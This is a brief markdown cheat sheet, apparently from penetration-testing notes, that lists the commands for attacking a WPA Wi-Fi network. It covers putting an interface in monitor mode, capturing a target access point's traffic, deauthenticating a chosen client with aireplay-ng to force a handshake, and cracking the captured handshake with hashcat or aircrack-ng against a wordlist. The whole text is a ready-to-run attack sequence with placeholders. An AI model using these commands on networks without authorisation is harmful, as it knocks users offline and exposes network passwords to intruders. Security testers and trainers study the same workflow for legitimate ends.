# Wi-Fi
`airmon-ng` check driver to install

`monitormode <INTERFACE> <MODE>`
`airodump-ng <INTERFACE>`
`airodump-ng -c <CHANNEL> --bssid <AP_MAC> -w <OUTPUT> <INTERFACE>`
`aireplay-ng -0 <AMOUNT_PACKETS> -a <AP_MAC> -c <TARGET_MAC> <INTERFACE>` deauth

/usr/lib/hashcat-utils/cap2hccapx.bin <CAP_FILE> <HCCAPX_FILE>  
`hashcat -m 2500 <CAP_FILE> <WORDLIST> --force --potfile-disable`
`aircrack-ng <CAP_FILE> -w <WORDLIST>`